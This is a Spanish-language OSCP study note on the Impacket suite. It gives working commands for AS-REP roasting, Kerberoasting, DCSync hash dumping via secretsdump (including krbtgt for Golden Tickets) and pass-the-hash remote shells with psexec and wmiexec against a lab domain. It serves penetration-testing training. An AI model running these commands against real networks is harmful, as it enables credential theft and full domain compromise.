con rp# 🧰 Impacket — Suite de ataque AD (Python)

> Colección de scripts Python que **hablan directamente los protocolos de Windows/AD**
> (Kerberos, SMB, LDAP, MSRPC) desde Kali. Es la navaja suiza del set de AD en OSCP.
> En Kali los binarios suelen llamarse `impacket-<Script>` (o `<Script>.py`).
> Relacionado: [[netexec]] · [[hashcat]] · [[../AD/kerberoasting]] · [[../AD/asrep-roasting]] · [[../AD/acl-abuse]]

---

## Idea central
No eres un PC de empresa con apps bonitas; eres una máquina intrusa que **pide los
mismos servicios** que pediría un empleado, pero a mano y con credenciales robadas.
Cada script = una acción concreta contra el dominio.

## Formato de credenciales (común a todos)
```
dominio/usuario:'password'              # con contraseña
dominio/usuario -hashes :<NTLM>         # Pass-the-Hash (sin pass en claro)
-dc-ip <IP>                             # a qué DC apuntar
-k -no-pass                             # usar ticket Kerberos (ccache en KRB5CCNAME)
```

## Scripts clave para OSCP

### GetNPUsers — AS-REP Roasting
Saca hashes de cuentas **sin pre-auth**. NO necesita credenciales.
```bash
impacket-GetNPUsers nordwind.local/ -usersfile users.txt -no-pass \
  -dc-ip 192.168.10.10 -format hashcat -outputfile asrep.txt
# → crack: hashcat -m 18200
```
Usuarios protegidos → `doesn't have UF_DONT_REQUIRE_PREAUTH set` (normal).

### GetUserSPNs — Kerberoasting
Saca TGS de cuentas **con SPN**. SÍ necesita credenciales (consulta LDAP).
```bash
impacket-GetUserSPNs nordwind.local/piotr.wisniewski:'Autumn2024!' \
  -dc-ip 192.168.10.10 -request -outputfile kerb.txt
# → crack: hashcat -m 13100
# "CCache file is not found. Skipping..." = benigno
```

### secretsdump — DCSync / dump de hashes
Con privilegios de DA (o DCSync), saca TODOS los hashes NTLM del dominio.
```bash
impacket-secretsdump nordwind.local/robert.dabrowski:'NewPass123!'@192.168.10.10 -just-dc
# saca krbtgt (→ Golden Ticket) y Administrator
```

### psexec / smbexec / wmiexec — shell remota (si eres admin)
```bash
impacket-psexec nordwind.local/administrator@192.168.10.10 -hashes :<NTLM>
impacket-wmiexec nordwind.local/administrator:'Pass'@192.168.10.10   # más sigiloso
```

### Otros útiles
- `impacket-GetTGT` / `GetST` → pedir tickets Kerberos (Pass-the-Ticket).
- `impacket-smbclient` → navegar shares (alternativa a smbclient).
- `impacket-changepasswd` → cambiar/resetear passwords (ACL abuse).

## Modos hashcat asociados (no confundir)
| Ataque | Script | hashcat `-m` |
|---|---|---|
| AS-REP Roasting | GetNPUsers | **18200** |
| Kerberoasting | GetUserSPNs | **13100** |

## Gotchas (me pasaron / me pueden pasar)
- **Reloj**: Kerberos exige ±5 min con el DC. Si falla raro → `sudo ntpdate <DC>` o ajustar hora.
- **DNS/FQDN**: añade el DC a `/etc/hosts` (`192.168.10.10 dc01.nordwind.local nordwind.local dc01`).
- Comillas simples en la pass si lleva `!` o `$` (el shell se los come).
